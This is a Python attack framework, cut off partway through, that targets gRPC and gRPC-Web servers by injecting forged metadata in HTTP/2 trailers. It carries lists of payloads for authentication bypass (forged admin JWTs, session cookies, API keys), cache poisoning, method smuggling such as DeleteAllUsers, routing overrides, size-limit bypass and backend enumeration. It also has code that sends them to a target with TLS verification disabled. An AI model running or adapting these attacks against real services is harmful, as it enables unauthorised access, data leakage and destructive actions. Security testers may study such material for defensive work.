#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced gRPC/gRPC-Web Trailer Metadata Poisoning Attack Framework
================================================================

A comprehensive security assessment tool for gRPC and gRPC-Web applications,
specifically targeting trailer header processing vulnerabilities and 
protocol conversion weaknesses.

Key Features:
- Complete gRPC and gRPC-Web protocol implementation
- HTTP/2 frame-level trailer manipulation
- Advanced cache poisoning via trailer injection
- Authentication bypass through trailer smuggling
- Routing decision manipulation attacks
- Protocol conversion differential analysis
- Timing-based trailer processing attacks
- Comprehensive vulnerability reporting

Attack Vectors:
- Authentication token trailer injection
- Cache key trailer poisoning
- Routing decision trailer manipulation
- gRPC-Web conversion differential attacks
- Trailer timing attacks
- Metadata size limit bypass
- HTTP/2 -> HTTP/1.1 trailer conversion abuse
- Backend service discovery via trailer manipulation
"""

import asyncio
import struct
import json
import base64
import socket
import ssl
import time
import zlib
import gzip
import logging
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from enum import IntEnum, Enum
from concurrent.futures import ThreadPoolExecutor
import hashlib
import hmac
import secrets
from datetime import datetime, timedelta
import re

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# 代理支持配置
PROXY_ENABLED = False
PROXY_URL = None

# 尝试导入代理模块
try:
    from fingerprint_proxy import open_connection as proxy_open_connection
    PROXY_AVAILABLE = True
except ImportError:
    PROXY_AVAILABLE = False
    async def proxy_open_connection(proxy_url, host, port, ssl_context=None, server_hostname=None):
        """Fallback to direct connection if proxy module not available"""
        if ssl_context:
            return await asyncio.open_connection(host, port, ssl=ssl_context, server_hostname=server_hostname)
        else:
            return await asyncio.open_connection(host, port)

class GrpcStatusCode(IntEnum):
    """gRPC Status Codes"""
    OK = 0
    CANCELLED = 1
    UNKNOWN = 2
    INVALID_ARGUMENT = 3
    DEADLINE_EXCEEDED = 4
    NOT_FOUND = 5
    ALREADY_EXISTS = 6
    PERMISSION_DENIED = 7
    RESOURCE_EXHAUSTED = 8
    FAILED_PRECONDITION = 9
    ABORTED = 10
    OUT_OF_RANGE = 11
    UNIMPLEMENTED = 12
    INTERNAL = 13
    UNAVAILABLE = 14
    DATA_LOSS = 15
    UNAUTHENTICATED = 16

class GrpcWebFormat(Enum):
    """gRPC-Web Formats"""
    TEXT = "application/grpc-web-text"
    BINARY = "application/grpc-web"
    PROTO_TEXT = "application/grpc-web-text+proto"
    PROTO_BINARY = "application/grpc-web+proto"

class HTTP2FrameType(IntEnum):
    """HTTP/2 Frame Types"""
    DATA = 0x0
    HEADERS = 0x1
    PRIORITY = 0x2
    RST_STREAM = 0x3
    SETTINGS = 0x4
    PUSH_PROMISE = 0x5
    PING = 0x6
    GOAWAY = 0x7
    WINDOW_UPDATE = 0x8
    CONTINUATION = 0x9

class HTTP2FrameFlag(IntEnum):
    """HTTP/2 Frame Flags"""
    END_STREAM = 0x1
    END_HEADERS = 0x4
    PADDED = 0x8
    PRIORITY = 0x20

@dataclass
class GrpcMessage:
    """gRPC Message Structure"""
    compressed: bool
    length: int
    data: bytes
    
    def __bytes__(self) -> bytes:
        """Convert to wire format"""
        flags = 1 if self.compressed else 0
        return struct.pack('>BI', flags, self.length) + self.data
    
    @classmethod
    def from_bytes(cls, data: bytes) -> 'GrpcMessage':
        """Parse from wire format"""
        if len(data) < 5:
            raise ValueError("Invalid gRPC message: too short")
        
        flags, length = struct.unpack('>BI', data[:5])
        compressed = bool(flags & 1)
        message_data = data[5:5+length]
        
        return cls(compressed=compressed, length=length, data=message_data)

@dataclass
class HTTP2Frame:
    """HTTP/2 Frame Structure"""
    length: int
    frame_type: HTTP2FrameType
    flags: int
    stream_id: int
    payload: bytes
    
    def __bytes__(self) -> bytes:
        """Convert to wire format"""
        header = struct.pack('>I', self.length)[1:]  # 3-byte length
        header += struct.pack('>BB', self.frame_type, self.flags)
        header += struct.pack('>I', self.stream_id & 0x7FFFFFFF)
        return header + self.payload

@dataclass
class AttackResult:
    """Attack Result Structure"""
    attack_type: str
    target_endpoint: str
    success: bool = False
    vulnerability_detected: bool = False
    evidence: List[str] = None
    response_status: Optional[int] = None
    response_headers: Dict[str, str] = None
    response_trailers: Dict[str, str] = None
    grpc_status: Optional[int] = None
    processing_time_ms: float = 0.0
    cache_poisoned: bool = False
    auth_bypassed: bool = False
    routing_manipulated: bool = False
    error: Optional[str] = None
    
    def __post_init__(self):
        if self.evidence is None:
            self.evidence = []
        if self.response_headers is None:
            self.response_headers = {}
        if self.response_trailers is None:
            self.response_trailers = {}

class GrpcTrailerPoisoning:
    """Advanced gRPC/gRPC-Web Trailer Metadata Poisoning Attack Framework"""
    
    def __init__(self, target_host: str, target_port: int = 443, 
                 timeout: float = 10.0, max_retries: int = 3):
        """Initialize the attack framework"""
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.max_retries = max_retries
        self.attack_stats = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'auth_bypasses': 0,
            'cache_poisoning': 0,
            'routing_manipulation': 0
        }
        self.discovered_endpoints = set()
        self.cache_state = {}
        
    async def run_comprehensive_assessment(self) -> Dict[str, Any]:
        """Run comprehensive gRPC trailer poisoning assessment"""
        logger.info(f"Starting gRPC/gRPC-Web trailer poisoning assessment against {self.target_host}:{self.target_port}")
        
        start_time = time.time()
        results = {
            'target': f"{self.target_host}:{self.target_port}",
            'timestamp': datetime.now().isoformat(),
            'attacks': {},
            'vulnerabilities': [],
            'statistics': {},
            'metadata': {
                'tool_version': '4.0',
                'assessment_duration': 0,
                'endpoints_discovered': 0
            }
        }
        
        # Phase 1: Service Discovery and Reconnaissance
        logger.info("Phase 1: gRPC service discovery and reconnaissance...")
        discovery_result = await self.discover_grpc_services()
        results['attacks']['service_discovery'] = discovery_result
        results['metadata']['endpoints_discovered'] = len(self.discovered_endpoints)
        
        # Phase 2: Authentication Token Trailer Injection
        logger.info("Phase 2: Testing authentication token trailer injection...")
        auth_result = await self.test_auth_trailer_injection()
        results['attacks']['auth_trailer_injection'] = auth_result
        
        # Phase 3: Cache Key Trailer Poisoning
        logger.info("Phase 3: Testing cache key trailer poisoning...")
        cache_result = await self.test_cache_trailer_poisoning()
        results['attacks']['cache_trailer_poisoning'] = cache_result
        
        # Phase 4: Routing Decision Trailer Manipulation
        logger.info("Phase 4: Testing routing decision trailer manipulation...")
        routing_result = await self.test_routing_trailer_manipulation()
        results['attacks']['routing_trailer_manipulation'] = routing_result
        
        # Phase 5: gRPC-Web Conversion Differential Attacks
        logger.info("Phase 5: Testing gRPC-Web conversion differential attacks...")
        conversion_result = await self.test_grpc_web_conversion_attacks()
        results['attacks']['grpc_web_conversion'] = conversion_result
        
        # Phase 6: Trailer Timing Attacks
        logger.info("Phase 6: Testing trailer timing attacks...")
        timing_result = await self.test_trailer_timing_attacks()
        results['attacks']['trailer_timing'] = timing_result
        
        # Phase 7: Metadata Size Limit Bypass
        logger.info("Phase 7: Testing metadata size limit bypass...")
        size_bypass_result = await self.test_metadata_size_bypass()
        results['attacks']['metadata_size_bypass'] = size_bypass_result
        
        # Phase 8: HTTP/2 to HTTP/1.1 Trailer Conversion Abuse
        logger.info("Phase 8: Testing HTTP/2 to HTTP/1.1 trailer conversion...")
        h2_h1_result = await self.test_h2_h1_trailer_conversion()
        results['attacks']['h2_h1_conversion'] = h2_h1_result
        
        # Phase 9: Backend Service Discovery
        logger.info("Phase 9: Testing backend service discovery...")
        backend_result = await self.test_backend_service_discovery()
        results['attacks']['backend_discovery'] = backend_result
        
        # Phase 10: Advanced Protocol Confusion
        logger.info("Phase 10: Testing advanced protocol confusion...")
        confusion_result = await self.test_protocol_confusion_attacks()
        results['attacks']['protocol_confusion'] = confusion_result
        
        # Compile results and generate report
        results['metadata']['assessment_duration'] = time.time() - start_time
        results['statistics'] = self.compile_attack_statistics()
        self._analyze_vulnerabilities(results)
        
        return results
    
    async def discover_grpc_services(self) -> Dict[str, Any]:
        """Discover available gRPC services and methods"""
        results = {
            'discovery_methods': [],
            'endpoints_found': [],
            'reflection_available': False,
            'web_interface_found': False
        }
        
        # Test gRPC reflection
        reflection_result = await self._test_grpc_reflection()
        results['discovery_methods'].append(reflection_result)
        results['reflection_available'] = reflection_result.get('available', False)
        
        # Test common gRPC endpoints
        common_endpoints = [
            '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
            '/grpc.health.v1.Health/Check',
            '/api.AuthService/Login',
            '/api.UserService/GetUser',
            '/api.AdminService/GetUsers',
            '/api.FileService/Upload',
            '/api.NotificationService/Send'
        ]
        
        endpoint_tasks = [self._test_endpoint_availability(endpoint) for endpoint in common_endpoints]
        endpoint_results = await asyncio.gather(*endpoint_tasks, return_exceptions=True)
        
        for endpoint, result in zip(common_endpoints, endpoint_results):
            if not isinstance(result, Exception) and result.get('available'):
                self.discovered_endpoints.add(endpoint)
                results['endpoints_found'].append(endpoint)
        
        # Test for gRPC-Web interface
        web_interface_result = await self._test_grpc_web_interface()
        results['web_interface_found'] = web_interface_result.get('found', False)
        
        return results
    
    async def test_auth_trailer_injection(self) -> Dict[str, Any]:
        """Test authentication token trailer injection attacks"""
        results = {
            'attack_vectors': [],
            'total_tests': 0,
            'successful_bypasses': 0,
            'vulnerabilities': []
        }
        
        # Authentication bypass attack vectors
        auth_vectors = [
            {
                'name': 'jwt_token_trailer_injection',
                'description': 'Inject JWT token in trailer to bypass authentication',
                'headers': {
                    'content-type': 'application/grpc',
                    'te': 'trailers',
                    'grpc-accept-encoding': 'identity,gzip'
                },
                'trailers': {
                    'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjk5OTk5OTk5fQ.admin_signature',
                    'x-user-role': 'admin',
                    'grpc-status': '0'
                },
                'payload': {'action': 'get_admin_data'}
            },
            {
                'name': 'session_cookie_trailer_smuggling',
                'description': 'Smuggle session cookie via trailer',
                'headers': {
                    'content-type': 'application/grpc+proto',
                    'user-agent': 'grpc-client'
                },
                'trailers': {
                    'cookie': 'sessionid=admin_session_12345; role=administrator',
                    'x-csrf-token': 'bypass_token',
                    'x-forwarded-user': 'admin@internal.com',
                    'grpc-status': '0'
                },
                'payload': {'request_type': 'sensitive_operation'}
            },
            {
                'name': 'api_key_trailer_override',
                'description': 'Override API key validation via trailer',
                'headers': {
                    'content-type': 'application/grpc-web',
                    'x-api-key': 'public_key_12345'
                },
                'trailers': {
                    'x-api-key': 'admin_master_key_67890',
                    'x-api-scope': 'admin,write,delete',
                    'x-internal-auth': 'trusted',
                    'grpc-metadata-x-admin-override': 'true'
                },
                'payload': {'admin_action': 'delete_all_users'}
            },
            {
                'name': 'oauth_token_trailer_elevation',
                'description': 'Elevate OAuth token scope via trailer',
                'headers': {
                    'content-type': 'application/grpc',
                    'authorization': 'Bearer user_limited_token'
                },
                'trailers': {
                    'authorization': 'Bearer admin_elevated_token',
                    'x-oauth-scope': 'admin read write delete',
                    'x-token-elevation': 'trailer_override',
                    'grpc-status': '0'
                },
                'payload': {'elevation_test': True}
            }
        ]
        
        # Test each authentication bypass vector
        for vector in auth_vectors:
            logger.debug(f"Testing auth vector: {vector['name']}")
            
            attack_result = await self._execute_trailer_auth_attack(vector)
            results['attack_vectors'].append(attack_result)
            results['total_tests'] += 1
            
            if attack_result.auth_bypassed:
                results['successful_bypasses'] += 1
                self.attack_stats['auth_bypasses'] += 1
                
                vulnerability = {
                    'type': 'Authentication Bypass via Trailer Injection',
                    'severity': 'CRITICAL',
                    'vector': vector['name'],
                    'description': vector['description'],
                    'evidence': attack_result.evidence,
                    'impact': 'Unauthorized access to protected resources',
                    'grpc_status': attack_result.grpc_status,
                    'response_status': attack_result.response_status
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_cache_trailer_poisoning(self) -> Dict[str, Any]:
        """Test cache key trailer poisoning attacks"""
        results = {
            'poisoning_tests': [],
            'total_tests': 0,
            'successful_poisoning': 0,
            'vulnerabilities': []
        }
        
        # Cache poisoning attack scenarios
        poisoning_scenarios = [
            {
                'name': 'cache_key_user_id_override',
                'description': 'Override user ID in cache key via trailer',
                'endpoint': '/api.UserService/GetProfile',
                'poison_request': {
                    'headers': {'content-type': 'application/grpc', 'x-user-id': '999'},
                    'trailers': {'x-user-id': '1', 'x-cache-control': 'max-age=3600'},
                    'payload': {'get_profile': True}
                },
                'victim_request': {
                    'headers': {'content-type': 'application/grpc', 'x-user-id': '999'},
                    'payload': {'get_profile': True}
                }
            },
            {
                'name': 'cache_vary_header_manipulation',
                'description': 'Manipulate Vary header for cache poisoning',
                'endpoint': '/api.ContentService/GetContent',
                'poison_request': {
                    'headers': {'content-type': 'application/grpc', 'accept-language': 'en'},
                    'trailers': {
                        'vary': 'accept-language, x-admin-flag',
                        'x-admin-flag': 'true',
                        'cache-control': 'public, max-age=7200'
                    },
                    'payload': {'content_id': 'sensitive_admin_content'}
                },
                'victim_request': {
                    'headers': {'content-type': 'application/grpc', 'accept-language': 'en'},
                    'payload': {'content_id': 'sensitive_admin_content'}
                }
            },
            {
                'name': 'backend_cache_key_pollution',
                'description': 'Pollute backend cache key via trailer smuggling',
                'endpoint': '/api.SearchService/Search',
                'poison_request': {
                    'headers': {
                        'content-type': 'application/grpc-web',
                        'x-search-query': 'public_query'
                    },
                    'trailers': {
                        'x-search-query': 'admin:sensitive_data',
                        'x-backend-cache-key': 'admin_search_results',
                        'x-cache-bypass': 'false'
                    },
                    'payload': {'query': 'admin:sensitive_data', 'include_private': True}
                },
                'victim_request': {
                    'headers': {'content-type': 'application/grpc', 'x-search-query': 'public_query'},
                    'payload': {'query': 'public_query'}
                }
            }
        ]
        
        # Execute cache poisoning tests
        for scenario in poisoning_scenarios:
            logger.debug(f"Testing cache poisoning: {scenario['name']}")
            
            poisoning_result = await self._execute_cache_poisoning_test(scenario)
            results['poisoning_tests'].append(poisoning_result)
            results['total_tests'] += 1
            
            if poisoning_result.cache_poisoned:
                results['successful_poisoning'] += 1
                self.attack_stats['cache_poisoning'] += 1
                
                vulnerability = {
                    'type': 'Cache Poisoning via Trailer Manipulation',
                    'severity': 'HIGH',
                    'scenario': scenario['name'],
                    'description': scenario['description'],
                    'evidence': poisoning_result.evidence,
                    'impact': 'Cache pollution leading to data leakage',
                    'endpoint': scenario['endpoint']
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_routing_trailer_manipulation(self) -> Dict[str, Any]:
        """Test routing decision trailer manipulation attacks"""
        results = {
            'routing_tests': [],
            'total_tests': 0,
            'successful_manipulation': 0,
            'vulnerabilities': []
        }
        
        # Routing manipulation attack vectors
        routing_vectors = [
            {
                'name': 'backend_service_override',
                'description': 'Override backend service routing via trailer',
                'base_request': {
                    'headers': {
                        'content-type': 'application/grpc',
                        ':path': '/api.PublicService/GetPublicData'
                    },
                    'payload': {'request': 'public_data'}
                },
                'manipulation_trailers': {
                    'x-backend-service': 'internal-admin-service',
                    'x-service-override': 'AdminService',
                    'x-forwarded-host': 'admin.internal',
                    'grpc-status': '0'
                }
            },
            {
                'name': 'method_name_smuggling',
                'description': 'Smuggle different method name via trailer',
                'base_request': {
                    'headers': {
                        'content-type': 'application/grpc+proto',
                        ':path': '/api.UserService/GetUser'
                    },
                    'payload': {'user_id': 123}
                },
                'manipulation_trailers': {
                    ':path': '/api.AdminService/DeleteAllUsers',
                    'grpc-method': 'DeleteAllUsers',
                    'x-method-override': 'DELETE',
                    'x-dangerous-operation': 'confirmed'
                }
            },
            {
                'name': 'load_balancer_manipulation',
                'description': 'Manipulate load balancer routing decisions',
                'base_request': {
                    'headers': {
                        'content-type': 'application/grpc-web',
                        'x-lb-target': 'public-backend'
                    },
                    'payload': {'operation': 'read_public'}
                },
                'manipulation_trailers': {
                    'x-lb-target': 'admin-backend',
                    'x-backend-weight': '100',
                    'x-routing-key': 'admin_cluster',
                    'x-service-mesh-override': 'internal'
                }
            }
        ]
        
        # Execute routing manipulation tests
        for vector in routing_vectors:
            logger.debug(f"Testing routing manipulation: {vector['name']}")
            
            routing_result = await self._execute_routing_manipulation_test(vector)
            results['routing_tests'].append(routing_result)
            results['total_tests'] += 1
            
            if routing_result.routing_manipulated:
                results['successful_manipulation'] += 1
                self.attack_stats['routing_manipulation'] += 1
                
                vulnerability = {
                    'type': 'Routing Manipulation via Trailer Injection',
                    'severity': 'HIGH',
                    'vector': vector['name'],
                    'description': vector['description'],
                    'evidence': routing_result.evidence,
                    'impact': 'Unauthorized access to internal services',
                    'routing_details': routing_result.response_headers
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_grpc_web_conversion_attacks(self) -> Dict[str, Any]:
        """Test gRPC-Web conversion differential attacks"""
        results = {
            'conversion_tests': [],
            'total_tests': 0,
            'conversion_vulnerabilities': 0,
            'vulnerabilities': []
        }
        
        # Test different gRPC-Web formats and conversion scenarios
        conversion_tests = [
            {
                'name': 'base64_trailer_encoding_bypass',
                'description': 'Bypass trailer validation via base64 encoding',
                'grpc_request': {
                    'format': 'native',
                    'headers': {'content-type': 'application/grpc'},
                    'trailers': {'x-admin-token': 'admin123', 'grpc-status': '0'}
                },
                'grpc_web_request': {
                    'format': GrpcWebFormat.TEXT,
                    'headers': {'content-type': 'application/grpc-web-text'},
                    'trailers': {'x-admin-token': 'admin123', 'grpc-status': '0'}
                }
            },
            {
                'name': 'binary_trailer_smuggling',
                'description': 'Smuggle binary data in trailers',
                'grpc_request': {
                    'format': 'native',
                    'headers': {'content-type': 'application/grpc+proto'},
                    'trailers': {'x-binary-payload': b'\x00\x01\x02\x03admin'}
                },
                'grpc_web_request': {
                    'format': GrpcWebFormat.BINARY,
                    'headers': {'content-type': 'application/grpc-web'},
                    'trailers': {'x-binary-payload': b'\x00\x01\x02\x03admin'}
                }
            },
            {
                'name': 'trailer_order_manipulation',
                'description': 'Manipulate trailer processing order',
                'grpc_request': {
                    'format': 'native',
                    'trailers': {
                        'grpc-status': '7',  # Permission denied first
                        'x-auth-override': 'admin',
                        'grpc-status': '0'  # Then success
                    }
                },
                'grpc_web_request': {
                    'format': GrpcWebFormat.PROTO_TEXT,
                    'trailers': {
                        'x-auth-override': 'admin',
                        'grpc-status': '0'  # Different order
                    }
                }
            }
        ]
        
        # Execute conversion differential tests
        for test in conversion_tests:
            logger.debug(f"Testing gRPC-Web conversion: {test['name']}")
            
            conversion_result = await self._execute_grpc_web_conversion_test(test)
            results['conversion_tests'].append(conversion_result)
            results['total_tests'] += 1
            
            if conversion_result.vulnerability_detected:
                results['conversion_vulnerabilities'] += 1
                
                vulnerability = {
                    'type': 'gRPC-Web Conversion Vulnerability',
                    'severity': 'MEDIUM',
                    'test': test['name'],
                    'description': test['description'],
                    'evidence': conversion_result.evidence,
                    'impact': 'Protocol conversion inconsistencies'
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_trailer_timing_attacks(self) -> Dict[str, Any]:
        """Test trailer timing-based attacks"""
        results = {
            'timing_tests': [],
            'total_tests': 0,
            'timing_vulnerabilities': 0,
            'vulnerabilities': []
        }
        
        # Timing attack scenarios
        timing_scenarios = [
            {
                'name': 'auth_validation_timing_leak',
                'description': 'Detect authentication validation via timing',
                'test_cases': [
                    {'trailers': {'authorization': 'Bearer valid_token_format'}, 'expected': 'slow'},
                    {'trailers': {'authorization': 'Bearer invalid'}, 'expected': 'fast'},
                    {'trailers': {'authorization': 'Bearer admin_token_12345'}, 'expected': 'variable'}
                ]
            },
            {
                'name': 'cache_hit_timing_analysis',
                'description': 'Analyze cache behavior via timing',
                'test_cases': [
                    {'trailers': {'x-cache-key': 'popular_content'}, 'expected': 'fast'},
                    {'trailers': {'x-cache-key': 'rare_content'}, 'expected': 'slow'},
                    {'trailers': {'x-cache-key': 'admin_content'}, 'expected': 'variable'}
                ]
            }
        ]
        
        for scenario in timing_scenarios:
            timing_result = await self._execute_timing_analysis(scenario)
            results['timing_tests'].append(timing_result)
            results['total_tests'] += 1
            
            if timing_result.get('timing_leak_detected'):
                results['timing_vulnerabilities'] += 1
                
                vulnerability = {
                    'type': 'Timing Information Leak',
                    'severity': 'MEDIUM',
                    'scenario': scenario['name'],
                    'description': scenario['description'],
                    'evidence': timing_result.get('evidence', []),
                    'impact': 'Information disclosure via timing analysis'
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_metadata_size_bypass(self) -> Dict[str, Any]:
        """Test metadata size limit bypass attacks"""
        results = {
            'size_tests': [],
            'total_tests': 0,
            'bypass_successful': 0,
            'vulnerabilities': []
        }
        
        # Test different size bypass techniques
        size_tests = [
            {
                'name': 'large_trailer_smuggling',
                'description': 'Smuggle large payloads via trailers',
                'technique': 'single_large_trailer',
                'trailer_size': 65536  # 64KB
            },
            {
                'name': 'multiple_trailer_accumulation',
                'description': 'Accumulate data across multiple trailers',
                'technique': 'multiple_trailers',
                'trailer_count': 100
            },
            {
                'name': 'compressed_trailer_bypass',
                'description': 'Bypass size limits with compressed trailers',
                'technique': 'compression',
                'compression_ratio': 10
            }
        ]
        
        for test in size_tests:
            logger.debug(f"Testing size bypass: {test['name']}")
            
            size_result = await self._execute_size_bypass_test(test)
            results['size_tests'].append(size_result)
            results['total_tests'] += 1
            
            if size_result.success:
                results['bypass_successful'] += 1
                
                vulnerability = {
                    'type': 'Metadata Size Limit Bypass',
                    'severity': 'MEDIUM',
                    'technique': test['technique'],
                    'description': test['description'],
                    'evidence': size_result.evidence,
                    'impact': 'Resource exhaustion, DoS potential'
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_h2_h1_trailer_conversion(self) -> Dict[str, Any]:
        """Test HTTP/2 to HTTP/1.1 trailer conversion abuse"""
        results = {
            'conversion_tests': [],
            'total_tests': 0,
            'conversion_abuses': 0,
            'vulnerabilities': []
        }
        
        # HTTP/2 to HTTP/1.1 conversion attack vectors
        conversion_vectors = [
            {
                'name': 'trailer_to_header_conversion',
                'description': 'Convert trailers to headers in HTTP/1.1',
                'http2_trailers': {
                    'authorization': 'Bearer admin_token',
                    'x-forwarded-for': '127.0.0.1',
                    'host': 'internal.admin'
                }
            },
            {
                'name': 'chunked_encoding_abuse',
                'description': 'Abuse chunked encoding trailer processing',
                'http2_trailers': {
                    'x-chunk-signature': 'admin_chunk',
                    'content-length': '0',  # Conflicting with chunked
                    'transfer-encoding': 'chunked'
                }
            }
        ]
        
        for vector in conversion_vectors:
            conversion_result = await self._execute_h2_h1_conversion_test(vector)
            results['conversion_tests'].append(conversion_result)
            results['total_tests'] += 1
            
            if conversion_result.vulnerability_detected:
                results['conversion_abuses'] += 1
                
                vulnerability = {
                    'type': 'HTTP/2 to HTTP/1.1 Conversion Abuse',
                    'severity': 'HIGH',
                    'vector': vector['name'],
                    'description': vector['description'],
                    'evidence': conversion_result.evidence,
                    'impact': 'Protocol downgrade attacks, header injection'
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_backend_service_discovery(self) -> Dict[str, Any]:
        """Test backend service discovery via trailer manipulation"""
        results = {
            'discovery_tests': [],
            'services_discovered': [],
            'internal_endpoints': [],
            'vulnerabilities': []
        }
        
        # Backend discovery techniques
        discovery_techniques = [
            {
                'name': 'service_mesh_enumeration',
                'trailers': {
                    'x-service-mesh-debug': 'true',
                    'x-envoy-debug': 'true',
                    'x-istio-debug': 'true'
                }
            },
            {
                'name': 'load_balancer_probing',
                'trailers': {
                    'x-lb-probe': 'true',
                    'x-health-check': 'debug',
                    'x-upstream-debug': 'true'
                }
            }
        ]
        
        for technique in discovery_techniques:
            discovery_result = await self._execute_backend_discovery(technique)
            results['discovery_tests'].append(discovery_result)
            
            if discovery_result.get('services_found'):
                results['services_discovered'].extend(discovery_result['services_found'])
                
                vulnerability = {
                    'type': 'Backend Service Information Disclosure',
                    'severity': 'MEDIUM',
                    'technique': technique['name'],
                    'services': discovery_result['services_found'],
                    'impact': 'Internal architecture disclosure'
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    async def test_protocol_confusion_attacks(self) -> Dict[str, Any]:
        """Test advanced protocol confusion attacks"""
        results = {
            'confusion_tests': [],
            'total_tests': 0,
            'confusion_vulnerabilities': 0,
            'vulnerabilities': []
        }
        
        # Protocol confusion scenarios
        confusion_scenarios = [
            {
                'name': 'grpc_http_hybrid_confusion',
                'description': 'Mix gRPC and HTTP semantics',
                'attack_vector': {
                    'headers': {
                        'content-type': 'application/grpc',
                        'accept': 'text/html,application/json'
                    },
                    'trailers': {
                        'location': '/admin/dashboard',
                        'set-cookie': 'admin=true',
                        'www-authenticate': 'Bearer realm="admin"'
                    }
                }
            },
            {
                'name': 'websocket_upgrade_confusion',
                'description': 'Confuse gRPC with WebSocket upgrade',
                'attack_vector': {
                    'headers': {
                        'content-type': 'application/grpc',
                        'upgrade': 'websocket',
                        'connection': 'upgrade'
                    },
                    'trailers': {
                        'sec-websocket-accept': 'admin_websocket_key',
                        'sec-websocket-protocol': 'admin-protocol'
                    }
                }
            }
        ]
        
        for scenario in confusion_scenarios:
            confusion_result = await self._execute_protocol_confusion_test(scenario)
            results['confusion_tests'].append(confusion_result)
            results['total_tests'] += 1
            
            if confusion_result.vulnerability_detected:
                results['confusion_vulnerabilities'] += 1
                
                vulnerability = {
                    'type': 'Protocol Confusion Vulnerability',
                    'severity': 'MEDIUM',
                    'scenario': scenario['name'],
                    'description': scenario['description'],
                    'evidence': confusion_result.evidence,
                    'impact': 'Protocol confusion leading to unexpected behavior'
                }
                results['vulnerabilities'].append(vulnerability)
        
        return results
    
    # Core execution methods
    
    async def _execute_trailer_auth_attack(self, vector: Dict) -> AttackResult:
        """Execute authentication trailer attack"""
        start_time = time.perf_counter()
        
        try:
            # Build gRPC request with authentication trailers
            headers = vector.get('headers', {})
            trailers = vector.get('trailers', {})
            payload = vector.get('payload', {})
            
            # Create gRPC message
            message_data = json.dumps(payload).encode()
            grpc_message = GrpcMessage(compressed=False, length=len(message_data), data=message_data)
            
            # Send request with trailers
            response = await self._send_grpc_request_with_trailers(headers, bytes(grpc_message), trailers)
            
            processing_time = (time.perf_counter() - start_time) * 1000
            
            # Analyze response for authentication bypass
            auth_bypassed = self._analyze_auth_bypass(response)
            evidence = self._extract_auth_evidence(response, vector)
            
            self.attack_stats['total_attacks'] += 1
            if auth_bypassed:
                self.attack_stats['successful_attacks'] += 1
            
            return AttackResult(
                attack_type='Authentication Trailer Injection',
                target_endpoint=vector['name'],
                success=response.get('status') == 200,
                vulnerability_detected=auth_bypassed,
                auth_bypassed=auth_bypassed,
                evidence=evidence,
                response_status=response.get('status'),
                response_headers=response.get('headers', {}),
                response_trailers=response.get('trailers', {}),
                grpc_status=response.get('grpc_status'),
                processing_time_ms=processing_time
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='Authentication Trailer Injection',
                target_endpoint=vector['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _execute_cache_poisoning_test(self, scenario: Dict) -> AttackResult:
        """Execute cache poisoning test"""
        try:
            endpoint = scenario['endpoint']
            poison_req = scenario['poison_request']
            victim_req = scenario['victim_request']
            
            # Step 1: Send poisoning request
            poison_response = await self._send_targeted_grpc_request(
                endpoint, 
                poison_req['headers'], 
                poison_req.get('trailers', {}), 
                poison_req['payload']
            )
            
            # Wait a bit for cache settling
            await asyncio.sleep(0.5)
            
            # Step 2: Send victim request
            victim_response = await self._send_targeted_grpc_request(
                endpoint,
                victim_req['headers'],
                {},
                victim_req['payload']
            )
            
            # Analyze for cache poisoning
            cache_poisoned = self._analyze_cache_poisoning(poison_response, victim_response)
            evidence = self._extract_cache_evidence(poison_response, victim_response)
            
            return AttackResult(
                attack_type='Cache Poisoning',
                target_endpoint=endpoint,
                success=poison_response.get('status') == 200,
                vulnerability_detected=cache_poisoned,
                cache_poisoned=cache_poisoned,
                evidence=evidence,
                response_status=victim_response.get('status'),
                response_headers=victim_response.get('headers', {}),
                response_trailers=victim_response.get('trailers', {})
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='Cache Poisoning',
                target_endpoint=scenario.get('endpoint', 'unknown'),
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    async def _execute_routing_manipulation_test(self, vector: Dict) -> AttackResult:
        """Execute routing manipulation test"""
        try:
            base_req = vector['base_request']
            manipulation_trailers = vector['manipulation_trailers']
            
            # Send request with routing manipulation trailers
            response = await self._send_grpc_request_with_trailers(
                base_req['headers'],
                self._create_grpc_payload(base_req['payload']),
                manipulation_trailers
            )
            
            # Analyze for routing manipulation
            routing_manipulated = self._analyze_routing_manipulation(response)
            evidence = self._extract_routing_evidence(response, vector)
            
            return AttackResult(
                attack_type='Routing Manipulation',
                target_endpoint=vector['name'],
                success=response.get('status') == 200,
                vulnerability_detected=routing_manipulated,
                routing_manipulated=routing_manipulated,
                evidence=evidence,
                response_status=response.get('status'),
                response_headers=response.get('headers', {}),
                response_trailers=response.get('trailers', {})
            )
            
        except Exception as e:
            return AttackResult(
                attack_type='Routing Manipulation',
                target_endpoint=vector['name'],
                success=False,
                vulnerability_detected=False,
                error=str(e)
            )
    
    # Core networking and protocol methods
    
    async def _send_grpc_request_with_trailers(self, headers: Dict, body: bytes, trailers: Dict) -> Dict[str, Any]:
        """Send gRPC request with trailers using HTTP/2"""
        try:
            # Establish HTTP/2 connection
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['h2', 'http/1.1'])
            
            reader, writer = await (
                proxy_open_connection(
                    PROXY_URL, 
                    self.target_host, 
                    self.target_port, 
                    ssl_context=context,
                    server_hostname=self.target_host
